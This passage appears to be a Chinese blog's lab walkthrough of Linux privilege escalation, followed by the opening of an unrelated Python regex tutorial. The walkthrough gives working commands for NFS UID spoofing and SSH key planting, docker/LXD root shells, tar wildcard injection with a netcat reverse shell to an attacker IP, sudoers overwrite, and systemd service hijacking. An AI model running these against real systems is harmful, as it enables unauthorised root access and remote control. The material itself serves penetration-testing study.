<p><strong>NFS的配置⽂件：</strong></p>
<blockquote>
<p><code>/etc/exports</code> </p>
</blockquote>
<p>如果<code>no_root_squash</code>出现在配置⽂件中的话，如果⽬录分享者是root，那么对于远程挂载⽤⼾来说，他也具有了该⽬录下root的权限。 </p>
<p><strong>常见操作：</strong></p>
<ul>
<li><p>查看远程主机共享的⽂件夹：<code>showmount -e 10.10.10.10</code></p>
</li>
<li><p>建⽴⽬录、挂载远程主机共享⽂件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mkdir /tmp/nfsdir  </span><br><span class="line">mount -t nfs <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span>:/shared /tmp/nfsdir    </span><br><span class="line">cd /tmp/nfsdir</span><br></pre></td></tr></table></figure>
</li>
<li><p>恶意利用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># copy wanted shell</span></span><br><span class="line">cp /bin/bash . </span><br><span class="line"><span class="comment"># set suid permission</span></span><br><span class="line">chmod +s bash</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="靶机演示"><a href="#靶机演示" class="headerlink" title="靶机演示"></a>靶机演示</h2><p>通过nmap扫描到靶机开放了2049服务，该端口对应nfs服务<br><img src="/2020/06/23/linux-tiquan/1592897611985.png" alt="1592897611985"></p>
<p> 安装nfs客户端工具</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">apt-get install nfs-common</span><br></pre></td></tr></table></figure>

<p>安装完成之后，使用showmount命令检索给定主机的导出文件夹列表。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">showmount -e <span class="number">192.168</span><span class="number">.211</span><span class="number">.161</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592898274698.png" alt="1592898274698"></p>
<p>账号peter的home目录可以被挂载</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mkdir /mnt/peter</span><br><span class="line">mount <span class="number">192.168</span><span class="number">.211</span><span class="number">.161</span>:/home/peter /mnt/peter</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592898522337.png" alt="1592898522337"></p>
<p>其中挂载好的peter目录显示的文件的所有者和所属组分别为1001和1005</p>
<p>当在/mnt/peter目录创建目录的时候提示权限不够<br><img src="/2020/06/23/linux-tiquan/1592898726491.png" alt="1592898726491"></p>
<p>即使在kali攻击机上是root用户，但是还没有写入权限，因为默认情况下客户端的root身份会被主动压缩成匿名者</p>
<p>可以伪造文件所有者的UID和GID来欺骗NFS服务器，创建一个gid为1005的用户组，接着创建peter这个账户uid指定为1001，gid指定为1005。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">groupadd -g <span class="number">1005</span> peter</span><br><span class="line">adduser peter -uid <span class="number">1001</span> -gid <span class="number">1005</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592898980254.png" alt="1592898980254">  </p>
<p>现在/mnt/peter下文件的所有者更换为peter，但现在还是以客户端的root登陆，服务端默认为匿名者<br><img src="/2020/06/23/linux-tiquan/1592899077861.png" alt="1592899077861"></p>
<p>切换到peter用户，服务端便会认为是存在的一个用户peter，并且可以创建文件</p>
<p><img src="/2020/06/23/linux-tiquan/1592899203987.png" alt="1592899203987"></p>
<p>能创建文件之后就可以写入ssh公钥文件(先使用ssh-keygen生成公私钥对)</p>
<p><img src="/2020/06/23/linux-tiquan/1592902461569.png" alt="1592902461569"></p>
<p>首先在/mnt/peter创建服务器上的.ssh目录，写入公钥，再通过私钥登陆</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mkdir .ssh</span><br><span class="line">cat ~/.ssh/id_rsa.pub &gt; /mnt/peter/.ssh/authorized_keys</span><br><span class="line">ssh peter@<span class="number">192.168</span><span class="number">.211</span><span class="number">.161</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592902516686.png" alt="1592902516686"></p>
<h1 id="利用docker组提权"><a href="#利用docker组提权" class="headerlink" title="利用docker组提权"></a>利用docker组提权</h1><p>通过groups命令得到peter用户也属于docker组<br><img src="/2020/06/23/linux-tiquan/1592903090831.png" alt="1592903090831"></p>
<p>当一个用户是’docker’组的成员时，运行以下命令将会得到一个root shell：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过拉取镜像的方式来获得一个shell</span></span><br><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利⽤DockerSocket提权办法</span></span><br><span class="line">sudo docker -H unix:<span class="comment">///google/host/var/run/docker.sock run -v /:/host -it</span></span><br><span class="line">ubuntu chroot /host /bin/bash</span><br><span class="line">sudo docker -H unix:<span class="comment">///google/host/var/run/docker.sock run -it --privileged --</span></span><br><span class="line">pid=host debian nsenter -t <span class="number">1</span> -m -u -n -i sh</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592903198145.png" alt="1592903198145"></p>
<p>参考：<a href="https://fosterelli.co/privilege-escalation-via-docker.html" target="_blank" rel="noopener">https://fosterelli.co/privilege-escalation-via-docker.html</a></p>
<h1 id="利用LXC-LXD-组提权"><a href="#利用LXC-LXD-组提权" class="headerlink" title="利用LXC/LXD 组提权"></a>利用LXC/LXD 组提权</h1><p><strong>利用条件：</strong></p>
<p>查看⽤⼾信息的时候，⽤⼾存在在组 lxc 或者 lxd 中 </p>
<p><strong>利用方法：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#kali里面执行：</span></span><br><span class="line"><span class="comment"># build a simple alpine image</span></span><br><span class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/saghul/lxd-alpine-builder</span></span><br><span class="line">./build-alpine -a i686</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#靶机中执行：</span></span><br><span class="line"><span class="comment"># import the image</span></span><br><span class="line">lxc image import ./alpine.tar.gz --alias myimage</span><br><span class="line"><span class="comment"># run the image</span></span><br><span class="line">lxc init myimage mycontainer -c security.privileged=<span class="keyword">true</span></span><br><span class="line"><span class="comment"># mount the /root into the image</span></span><br><span class="line">lxc config device add mycontainer mydevice disk source=/ path=/mnt/root</span><br><span class="line">recursive=<span class="keyword">true</span></span><br><span class="line"><span class="comment"># interact with the container</span></span><br><span class="line">lxc start mycontainer</span><br><span class="line">lxc exec mycontainer /bin/sh</span><br></pre></td></tr></table></figure>

<p>在攻击机执⾏ </p>
<p>参考：<a href="https://freehk.top/2019/12/10/linux-lxd%E6%8F%90%E6%9D%83/" target="_blank" rel="noopener">https://freehk.top/2019/12/10/linux-lxd%E6%8F%90%E6%9D%83/</a></p>
<h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录</p>
<h2 id="Cron"><a href="#Cron" class="headerlink" title="Cron"></a><strong>Cron</strong></h2><p><strong>crontab文件格式：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">基本格式 :</span><br><span class="line"> *　　*　　*　　*　　*　　command</span><br><span class="line"> 分　 时　 日　 月　 周　 命令</span><br></pre></td></tr></table></figure>

<blockquote>
<p>第1列表示分钟1～59 每分钟用*或者 */1表示<br>第2列表示小时1～23（0表示0点）<br>第3列表示日期1～31<br>第4列表示月份1～12<br>第5列标识号星期0～6（0表示星期天）<br>第6列要运行的命令</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line"><span class="number">30</span> <span class="number">21</span> * * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每晚的<span class="number">21</span>:<span class="number">30</span>重启apache。</span><br><span class="line"></span><br><span class="line"><span class="number">45</span> <span class="number">4</span> <span class="number">1</span>,<span class="number">10</span>,<span class="number">22</span> * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每月<span class="number">1</span>、<span class="number">10</span>、<span class="number">22</span>日的<span class="number">4</span> : <span class="number">45</span>重启apache。</span><br><span class="line"></span><br><span class="line"><span class="number">10</span> <span class="number">1</span> * * <span class="number">6</span>,<span class="number">0</span> /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每周六、周日的<span class="number">1</span> : <span class="number">10</span>重启apache。</span><br></pre></td></tr></table></figure>

<ul>
<li><p>检查系统中存在的cron计划任务，看看是否有权限访问和修改 </p>
</li>
<li><p>检查⽂件内容，看看有没有可以提权的途径 </p>
</li>
<li><p>利⽤pspy⼯具，检查命令和⽂件系统事件 ./pspy64 -pf -i 1000 </p>
</li>
</ul>
<p>一些敏感的目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/etc/init.d</span><br><span class="line">/etc/cron*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.allow</span><br><span class="line">/etc/cron.d</span><br><span class="line">/etc/cron.deny</span><br><span class="line">/etc/cron.daily</span><br><span class="line">/etc/cron.hourly</span><br><span class="line">/etc/cron.monthly</span><br><span class="line">/etc/cron.weekly</span><br><span class="line">/etc/sudoers</span><br><span class="line">/etc/exports</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/<span class="keyword">var</span>/spool/cron</span><br><span class="line">/<span class="keyword">var</span>/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /<span class="keyword">var</span>/spool/cron;</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny*</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592817734754.png" alt="1592817734754"></p>
<p>cron的⽇志⽂件存储为 /var/log/cronlog ，可以看到最近执⾏的定时任务信息</p>
<blockquote>
<p>相关信息</p>
<ul>
<li>配置文件读取路径</li>
</ul>
<ol>
<li><p>/var/spool/cron/ , 由crontab -e 进行写入，配置文件无需指定用户；用户创建的任务在</p>
<p>对应用户名文件夹下。 </p>
</li>
<li><p>/etc/crontab ，只能root 进行编辑，配置文件需指定用户</p>
</li>
<li><p>/etc/cron.d/ ,在此文件夹下创建定时任务文件（和 /etc/crontab 一样）</p>
</li>
</ol>
<ul>
<li>日志保存地址：/var/log/cron；要禁止某个用户使用，将用户名添加到 /etc/cron.deny文件中。 </li>
</ul>
</blockquote>
<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p>通配符是一种特殊语句，主要有型号（*）和问号（？），用来对字符串进行模糊匹配（比如文件名，参数名）。当查找文件夹时，可以使用它来代替一个或多个真正字符；当不知道真正字符或懒得输入完整名字时，常常使用通配符代替一个或多个真正的字符。</p>
<blockquote>
<p><strong>*</strong>  代表任意多个字符</p>
<p><strong>?</strong>  代表任意单个字符</p>
<p><strong>[ ]</strong> 代表”[“和”]”之间的某一个字符，比如[0-9]可以代表0-9之间的任意一个数字，[a-zA-Z]可以代表a-z和A-Z之间的任意一个字母，字母区分大小写。</p>
<p><strong>–</strong> 代表一个字符。</p>
<p><strong>~</strong> 用户的根目录。</p>
</blockquote>
<p>利用通配符进行本地提权：<br><a href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/</a></p>
<h2 id="提权演示-3"><a href="#提权演示-3" class="headerlink" title="提权演示"></a>提权演示</h2><p>首先查看<code>/etc/crontab</code>的定时任务<br><img src="/2020/06/23/linux-tiquan/1592872154310.png" alt="1592872154310"></p>
<p> 查看/etc/cron.daily/backup文件：</p>
<p><img src="/2020/06/23/linux-tiquan/1592872228674.png" alt="1592872228674"></p>
<p>时任务的执行权限是root，将用户家目录下的文件备份到/etc/backups/下，使用通配符<code>*</code><br><strong>反弹shell</strong><br>使用msfvenom生成反弹sell的一句话</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=<span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span> lport=<span class="number">7777</span> R</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592872467958.png" alt="1592872467958"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mkfifo /tmp/waqwv; nc <span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span> <span class="number">7777</span> <span class="number">0</span>&lt;/tmp/waqwv | /bin/sh &gt;/tmp/waqwv <span class="number">2</span>&gt;&amp;<span class="number">1</span>; rm /tmp/waqwv</span><br></pre></td></tr></table></figure>

<p>之后将payload写入shell.sh，并赋予执行权限(  在tar处理的目录下写入shell.sh  )</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"mkfifo /tmp/waqwv; nc 192.168.211.151 7777 0&lt;/tmp/waqwv | /bin/sh &gt;/tmp/waqwv 2&gt;&amp;1; rm /tmp/waqwv"</span> &gt; shell.sh &amp;&amp; chmod +x shell.sh</span><br><span class="line">    </span><br><span class="line"><span class="comment">#再创建两个文件</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">"--checkpoint-action=exec=sh shell.sh"</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">"--checkpoint=1"</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592872807490.png" alt="1592872807490"></p>
<p>最后使用nc监听7777端口等待定时任务执行即可<br><img src="/2020/06/23/linux-tiquan/1592872955100.png" alt="1592872955100"></p>
<p>  实际上，定时任务执行的命令为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">tar -zcf /etc/backups/home-bob.tgz *</span><br><span class="line">|</span><br><span class="line">|-&gt;</span><br><span class="line">	tar -zcf /etc/backups/home-bob.tgz --checkpoint=<span class="number">1</span> --checkpoint-action=exec=sh shell.sh shell.sh</span><br></pre></td></tr></table></figure>

<ul>
<li><code>--checkpoint-action</code>选项：用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。 因此，选项<code>--checkpoint=1</code>和<code>--checkpoint-action=exec=sh shell.sh</code>作为命令行选项交给了tar程序。</li>
</ul>
<p><strong>直接修改/etc/sudoers文件：</strong>  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'echo "ignite ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers'</span> &gt;shell.sh</span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">"--checkpoint-action=exec=sh shell.sh"</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">"--checkpoint=1"</span></span><br></pre></td></tr></table></figure>

<p><strong>利用工具：</strong><a href="https://github.com/localh0t/wildpwn" target="_blank" rel="noopener">wildpwn</a></p>
<h1 id="system配置"><a href="#system配置" class="headerlink" title="system配置"></a>system配置</h1><h2 id="systemd简介"><a href="#systemd简介" class="headerlink" title="systemd简介"></a>systemd简介</h2><ul>
<li><p>系统定时器，也是计划任务的⼀种 </p>
<p>查询命令： <code>systemctl list-timers --all</code></p>
</li>
</ul>
<p>相关信息： </p>
<ol>
<li><p>如果想使用systemd作为定时器，需要先创建一个服务单元，之后再创建计时器单元 </p>
</li>
<li><p>重新加载配置： <code>systemctl daemon-reload</code></p>
</li>
<li><p><code>journalctl -u mytimer</code>查看<code>mytimer.timer</code>和 <code>mytimer.service</code>的日志 </p>
<p>详细原理：<a href="https://www.linuxidc.com/Linux/2019-05/158599.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2019-05/158599.htm</a> </p>
</li>
</ol>
<p><img src="/2020/06/23/linux-tiquan/1592818118936.png" alt="1592818118936"></p>
<p>一般我们通过一下命令来启动apache2服务</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/apache2 start</span><br><span class="line">或者</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>

<p>但是这种方法有两个缺点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">一是启动时间长。init进程是串行启动，只有前一个进程启动完，才会启动下一个进程。 </span><br><span class="line">二是启动脚本复杂。init进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长</span><br></pre></td></tr></table></figure>

<p>Systemd 就是为了解决这些问题而诞生的。它的设计目标是为系统的启动和管理提供一套完整的解决方案。 </p>
<p>使用了 Systemd，就不需要再用init了。Systemd 取代了init.d，成为系统的第一个进程（PID 等于 1），其他进程都是它的子进程。  </p>
<p>Systemd 并不是一个命令，而是一组命令，涉及到系统管理的方方面面。</p>
<p>常用命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重启系统</span></span><br><span class="line">$ sudo systemctl reboot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭系统，切断电源</span></span><br><span class="line">$ sudo systemctl poweroff</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 查看启动耗时</span></span><br><span class="line">$ systemd-analyze                                                                     </span><br><span class="line"><span class="comment"># 查看每个服务的启动耗时</span></span><br><span class="line">$ systemd-analyze blame</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 显示当前主机的信息</span></span><br><span class="line">$ hostnamectl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置主机名。</span></span><br><span class="line">$ sudo hostnamectl set-hostname rhel7</span><br></pre></td></tr></table></figure>

<h2 id="提权演示-4"><a href="#提权演示-4" class="headerlink" title="提权演示"></a>提权演示</h2><p>首先查看peter用户的systemd配置，发现peter拥有debug.service文件，并且具有读写权限</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">whereis systemd</span><br><span class="line">ls -al /lib/systemd/system/debug.service</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592904523563.png" alt="1592904523563"></p>
<p><img src="/2020/06/23/linux-tiquan/1592904547093.png" alt="1592904547093"></p>
<p>如果服务器存在缺陷，可以被覆盖或者修改文件，可以通过修改低权限用户有权访问的.service文件并更改run()命令来将其转换为代码执行。重新启动服务时，将运行攻击者的命令。</p>
<p>查看.service文件</p>
<p><img src="/2020/06/23/linux-tiquan/1592904662891.png" alt="1592904662891"></p>
<p>这里需要修改ExecStart文件使得在程序开始时执行命令，除此之外还可以修改ExecStop和ExecReload来在停止和重启服务时执行命令</p>
<p>接着让root身份来创建一个systemdexpl.sh脚本，将/bin/bash文件复制到systemdbash并设置一个SUID位并且赋予执行权限。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> -e <span class="string">'#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash'</span> &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh</span><br><span class="line">    </span><br><span class="line"><span class="comment">#-e为换行显示</span></span><br></pre></td></tr></table></figure>

<p>之后在修改debug.service文件来调用创建的脚本</p>
<p><img src="/2020/06/23/linux-tiquan/1592905283872.png" alt="1592905283872"></p>
<p>重启系统，再次连接</p>
<p><img src="/2020/06/23/linux-tiquan/1592906242457.png" alt="1592906242457"></p>
<p>之后使用suid提权即可获得root权限，<code>./systemdbash -p</code>就相当于是bash的suid提权</p>
<p><img src="/2020/06/23/linux-tiquan/1592906414669.png" alt="1592906414669"></p>
<p>可以将systemdexpl.sh的内容修改为将公钥写入/root/.ssh</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> -e <span class="string">'#!/bin/bash \ncp /home/peter/.ssh/* /root/.ssh/'</span> &gt; /home/peter/systemdexpl2.sh &amp;&amp; chmod +x systemdexpl2.sh</span><br><span class="line">    </span><br><span class="line"><span class="comment">#修改/lib/systemd/system/debug.service中的ExecStart为脚本路径</span></span><br><span class="line">vim /lib/systemd/system/debug.service</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592906671750.png" alt="1592906671750"></p>
<p>  重启系统之后直接使用root用户登录即可<br><img src="/2020/06/23/linux-tiquan/1592907110828.png" alt="1592907110828"></p>
<h1 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h1><p>内核提权漏洞（依靠EXP） </p>
<ol>
<li><p>在exploit-db、或者其他搜索引擎上查找相关提权漏洞。 </p>
</li>
<li><p>利⽤脏⽜ ( 2.6.22&lt;=kernel &lt;= 4.8.3、4.7.9、4.4.26LTS ） </p>
</li>
<li><p>⼀般这种提权漏洞都是c的，需要gcc编译<code>gcc filename -o outfilename</code> 。 </p>
</li>
</ol>
<p>内核漏洞搜集项⽬： </p>
<p><a href="https://github.com/lucyoa/kernel-exploits/" target="_blank" rel="noopener">https://github.com/lucyoa/kernel-exploits/</a> </p>
<p><a href="https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits" target="_blank" rel="noopener">https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits</a> </p>
<p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a> 中⽂ NICE~ </p>
<p><a href="https://github.com/xairy/kernel-exploits" target="_blank" rel="noopener">https://github.com/xairy/kernel-exploits</a> </p>
<p><a href="https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/" target="_blank" rel="noopener">https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/</a> </p>
<p>常⻅漏洞： </p>
<ol>
<li>CVE-2016-5195 (DirtyCow)：（Linux Kernel &lt;= 3.19.0-73.8） </li>
</ol>
<p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" target="_blank" rel="noopener">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a> </p>
<p><a href="https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c" target="_blank" rel="noopener">https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c</a> </p>
<ol start="2">
<li>CVE-2010-3904 (RDS)：（Linux Kernel &lt;= 2.6.36-rc8） </li>
</ol>
<p><a href="https://www.exploit-db.com/exploits/15285/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/15285/</a> </p>
<ol start="3">
<li>CVE-2010-4258 (Full Nelson)：（Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)） </li>
</ol>
<p><a href="https://www.exploit-db.com/exploits/15704/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/15704/</a> </p>
<ol start="4">
<li>CVE-2012-0056 (Mempodipper)：（Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)） </li>
</ol>
<p><a href="https://www.exploit-db.com/exploits/18411" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/18411</a> </p>
<p>在linux中常见的几种提权方式就差不多是这些了，当然这些只是众多提权方法中的一些皮毛，要正真熟练掌握linux提权还需要多思考，多练习。</p>
<h1 id="补充："><a href="#补充：" class="headerlink" title="补充："></a><strong>补充：</strong></h1><p>查看用户拥有的文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -user username <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>









<p>参考文章：<br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#cron-jobs" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#cron-jobs</a></p>
<p>参考文章：<br><a href="https://www.fenghlz.xyz/passages/2020-02-22-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0-LIN-SECURITY%E9%9D%B6%E5%9C%BA/" target="_blank" rel="noopener">https://www.fenghlz.xyz/passages/2020-02-22-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0-LIN-SECURITY%E9%9D%B6%E5%9C%BA/</a></p>
<p>提权在线查询：<br><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
        <tag>Linux提权</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫--正则表达式&amp;&amp;浏览器伪装</title>
    <url>/2020/03/09/zzbds/</url>
    <content><![CDATA[<h1 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h1><p>世界上的信息非常多，而我们关注的信息有限。假如我们希望只提取出关注的数据，此时可以通过一些表达式进行提取，正则表达式就是其中一种进行数据筛选的表达式。<a id="more"></a></p>
<h1 id="原子"><a href="#原子" class="headerlink" title="原子"></a>原子</h1><p>原子是正则表达式中最基本的组成单位，每个正则表达式中至少要包含一个原子。常见的原子类型有：</p>
<h2 id="1-普通字符作为原子"><a href="#1-普通字符作为原子" class="headerlink" title="1.普通字符作为原子"></a>1.普通字符作为原子</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re <span class="comment">#正则模块</span></span><br><span class="line">string=<span class="string">"kasldfn;asdjkfll;dj"</span></span><br><span class="line"><span class="comment">#普通字符作为原子</span></span><br><span class="line">pat=<span class="string">"dfn"</span></span><br><span class="line">result=re.search(pat,string)<span class="comment">#从string中筛选pat</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/1.png" alt></p>
<h2 id="2-非打印字符作为原子"><a href="#2-非打印字符作为原子" class="headerlink" title="2.非打印字符作为原子"></a>2.非打印字符作为原子</h2><p>非打印字符指的是不打印出来的字符，比如’\n’换行符，’\t’制表符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re <span class="comment">#正则模块</span></span><br><span class="line">string=<span class="string">'''kasldfn;asd</span></span><br><span class="line"><span class="string">jkfll;dj</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#非打印字符作为原子</span></span><br><span class="line">pat=<span class="string">'\n'</span><span class="comment">#从string中匹配换行符</span></span><br><span class="line">result=re.search(pat,string)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/2.png" alt></p>
<h2 id="3-通用字符作为原子"><a href="#3-通用字符作为原子" class="headerlink" title="3.通用字符作为原子"></a>3.通用字符作为原子</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通用字符作为原子</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">常用的通用字符原子</span></span><br><span class="line"><span class="string">\w   匹配所有字母、数字、下划线</span></span><br><span class="line"><span class="string">\W 除字母、数字、下划线</span></span><br><span class="line"><span class="string">\d   匹配十进制数字</span></span><br><span class="line"><span class="string">\D   除十进制数字以外的</span></span><br><span class="line"><span class="string">\s    匹配空白字符</span></span><br><span class="line"><span class="string">\S   除空白字符外的</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> re <span class="comment">#正则模块</span></span><br><span class="line">string=<span class="string">"dsfjadhfjklh13135138498482.asdfsdfa"</span></span><br><span class="line">pat=<span class="string">"\d\d\d"</span> <span class="comment">#匹配出三个十进制数</span></span><br><span class="line">result=re.search(pat,string)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/3.png" alt></p>
<h2 id="4-原子表"><a href="#4-原子表" class="headerlink" title="4.原子表"></a>4.原子表</h2><p> 将几个原子组成一个表叫做原子表,匹配是从原子表中选择一个原子出来匹配</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re <span class="comment">#正则模块</span></span><br><span class="line">string=<span class="string">"dsfjadhfjklh13135138498482.asdfsdfa"</span></span><br><span class="line">pat=<span class="string">"dsfj[dsa]dhf"</span> </span><br><span class="line">result=re.search(pat,string)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/4.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re <span class="comment">#正则模块</span></span><br><span class="line">string=<span class="string">"dsfjadhfjklh13135138498482.asdfsdfa"</span></span><br><span class="line">pat=<span class="string">"dsfj[^dsa]dhf"</span> <span class="comment">#除了原子表里的原子匹配，^代表非</span></span><br><span class="line">result=re.search(pat,string)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<h1 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h1><p>所谓的元字符，就是正则表达式中具有一些特殊含义的字符，比如重复N次前面的字符等</p>
